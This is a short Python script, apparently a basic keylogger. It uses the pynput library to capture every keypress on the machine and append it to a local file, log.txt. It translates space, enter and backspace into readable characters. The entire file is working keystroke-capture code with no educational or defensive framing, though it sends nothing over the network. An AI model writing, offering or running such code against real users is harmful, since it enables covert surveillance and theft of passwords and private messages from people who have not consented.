from pynput.keyboard import Listener

def writeToFile(key):
    letter = str(key)
    letter = letter.replace("'","")
    
    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.shift':
        letter = ''
    elif letter == 'Key.enter':
        letter = '\n'
    elif letter == 'Key.backspace':
        letter = '^'
    elif letter == 'Key.shift_r':
        letter = ''
    elif letter == 'Key.enter':
        letter = '\n'
    elif letter == 'Key.ctrl_l':
        letter = '...'
    elif letter == 'Key.ctrl_r':
        letter = '...'
    with open("log.txt", 'a') as f:
        f.write(letter)
with Listener(on_press=writeToFile) as l:
    l.join()